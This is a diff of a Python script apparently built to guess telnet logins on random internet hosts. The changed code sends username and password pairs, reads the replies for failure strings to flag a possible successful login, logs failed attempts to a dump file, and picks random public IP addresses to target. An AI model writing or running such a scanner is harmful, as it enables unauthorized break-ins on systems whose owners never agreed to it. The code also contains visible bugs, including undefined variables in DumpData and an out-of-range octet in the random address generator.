@@ -239,9 +239,14 @@ def Hacksmtp (serverHost, serverPort, timeout):
 
 
 
+# *********************** DumpData **********************************
 
-
-
+def DumpData(serverHost,serverPort, username, password, timeout, data):
+	dumpfile = "dump.txt"
+	print ("**** Emergency dump from IP:",ipnumber,"\n port:",port,"username tried was",username, "password tried was", password,"timeout was", timeout,"data encountered was", data, "****")
+	dumphandle = open(dumpfile, "a")
+	print ("\n ************** Emergency dump ****************\n\n from IP:",ipnumber,"\n port:",port,"\n username tried was",username, "\n password tried was", password,"\n timeout was", timeout,"\ndata encountered was(newline is mine):\n", data, "\n*************************** END OF DATA *************************\n\n\n\n\n", file = dumphandle)
+	dumphandle.close()
 
 #************************ HackTelnet *************************
 def HackTelnet (serverHost, serverPort, username, password, timeout):
@@ -249,24 +254,24 @@ def HackTelnet (serverHost, serverPort, username, password, timeout):
 	import sys
 	import time
 	uname_n_pwd = [username,password]
-	#sockobj= socket(AF_INET, SOCK_STREAM)
 	try:
 		sockobj= socket(AF_INET, SOCK_STREAM)
-		sockobj.settimeout(timeout)
+		sockobj.settimeout(timeout)	
 	except:
 		print ("*** COULDN'T START STREAM, BAD IP?")
 		return ("BADIP")
-	#sockobj= (AF_INET, SOCK_STREAM)
 	data = ""
+
+	#sockobj.connect((serverHost, serverPort))
+	#data = sockobj.recv(1024)
+	
 	try:
 		sockobj.connect((serverHost, serverPort))
 		data = sockobj.recv(1024)
-	#except socket.timeout:
-	#	print ("*** CONNECTION TIMED OUT ***")
-	#	return ("BADIP")	
 	except:
 		print ("*** COULDN'T CONNECT TO TELNET HOST, SUCKY IP ADDRESS ***")
 		return ("BADIP")
+	
 	print ("*******************************************")
 	print ("First reply from",serverHost, repr(data))
 	print ("First reply (raw):",data)
@@ -277,60 +282,113 @@ def HackTelnet (serverHost, serverPort, username, password, timeout):
 		print ("openhandles:",openhandles)
 		time.sleep(1)
 		return ("BADIP")
-
-
-	# I've got the synchronization wrong, this was an attempt to cure it
-	#transmitted = repr(data)
-	#while (transmitted.find("sername") < 0):
-	#	data = sockobj.recv(1024)
-	#	transmitted = repr(data)	
-		
+	
+	
 	for hack in range (0,2):
 		print ("*********** HACKLOOP BEGINS. Have looped:",hack,"times ********")
 		print (hack, uname_n_pwd[hack])
 		sockno = sockobj
 		print ("sockno:",sockno)
 
+		result = repr(data)
+		looptimes = 0
+		####### Wait till we have what looks like a prompt (the string ":") (not the quotations marks dummy) #######
+		while (result.find(':') < 0):
+			try:
+				data = sockobj.recv(1024)
+			except:
+				print ("Couldn't get data after handshake negotiated. Dumping and quitting...")
+				DumpData(serverHost,serverPort, username, password, timeout, data)
+				print ("IP: ",serverHost, ":",serverPort)
+				return ("BADIP")
+
+			result = repr(data)
+			looptimes += 1
+			print ("FROM ",serverHost, ":",result)
+			if (looptimes > 10):
+				print ("Something has gone wrong. Dumping data to file and quitting")
+				DumpData(serverHost,serverPort, username, password, timeout, data)
+				print ("IP: ",serverHost, ":",serverPort)
+				return ("BADIP")
+
 		print ("sending",uname_n_pwd[hack])
 		try:
-			sockobj.send (uname_n_pwd[hack].encode('ascii')+b"\n")
+			sockobj.send (uname_n_pwd[hack].encode('ascii')+b"\n")			
+		except:
+			print ("Couldn't send (timeout?), dumping data....")
+			DumpData(serverHost,serverPort, username, password, timeout, data)
+			return ("BADIP")
+
+		try:
 			data = sockobj.recv(1024)
 		except:
-			print ("There's something there but I can't get to it. Keep this IP for later.")
-			return (False)
+			print ("There's something there but I can't get to it. (timeout?) Keep this IP for later.")
+			DumpData(serverHost,serverPort, username, password, timeout, data)
+			return ("BADIP")
+
+		result = repr(data)
+		print ("RECV'd:",result)
+		'''
 		print ("from",serverHost, repr(data))
 		try:
 			print ("Decd",serverHost, data.decode())
 		except:
 			print ("Can't decode, this is bad!")
+		'''
 		#print ("Attempt to get inside repr(data):")
 		#print (data (socket))
+		
+	try:
+		data = sockobj.recv(1024)
+	except:
+		print ("Couldn't recv, dumping data....")
+		#print ("There's something there but I can't get to it. Keep this IP for later.")
+		DumpData(serverHost,serverPort, username, password, timeout, data)
+		return ("BADIP")
+		
 	result = repr(data)
 	openhandles = sockobj.close()
 	print ("openhandles:",openhandles)
 	sockno = sockobj
 	print ("sockno:",sockno)
-	print ("Last result:",result)
+	print ("FINAL RECVD DATA:",result)
 	#print ("Dec\'d:",sockno.decode())
 	#sockobj.shutdown(openhandles)
 	time.sleep (1)
-	if (result.find('ogin:') > -1):
+	if (result.find('ailed') > -1):
+		print ("WRONG USERNAME OR PASSWORD (telnet found a \"nvalid\" error message)")
+		return (False)
+
+	if (result.find('nvalid') > -1):
+		print ("WRONG USERNAME OR PASSWORD (telnet found a \"nvalid\" error message)")
+		return (False)
+
+	elif (result.find('ailure') > -1):
+		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ailure\" error message)")
+		return (False)
+
+	elif (result.find('ogin:') > -1):
 		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ogin:\" prompt)")
 		return (False)
 
-	if (result.find('sername:') > -1):
+	elif (result.find('sername:') > -1):
 		print ("WRONG USERNAME OR PASSWORD (telnet found a \"sername:\" prompt)")
 		return (False)
 
-	if (result.find('ad name or password') > -1):
+	elif (result.find('ad name or password') > -1):
 		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ad name or password\" error message)")
 		return (False)
+
 	elif (result.find('incorrect') > -1):
 		print ("WRONG USERNAME OR PASSWORD (telnet found an (\"incorrect\" error message)")
 		return (False)	
 	else:
 		print ("***********MAYBE (telnet)!!*********")
 		return (True)
+
+
+
+
 
 
 
@@ -410,16 +468,16 @@ def GetSingleOption(option):
 def GetRandomIP():
 	import random 
 	first_octet = 127
-	while (first_octet == 127):
+	first_n_second = "192.168"
+	while (first_octet == 127 or first_n_second == "192.168"):
 		first_octet = random.randint(0,256)
 		second_octet = random.randint(0,256)
 		third_octet = random.randint(0,256)
 		fourth_octet = random.randint(0,256)
+		first_n_second = str(first_octet)+"."+str(second_octet)
 	ipnumber = str(first_octet)+"."+str(second_octet)+"."+str(third_octet)+"."+str(fourth_octet)
 	print ("random ipnumber is:",ipnumber)
 	return(ipnumber)
-	
-
 
 
 
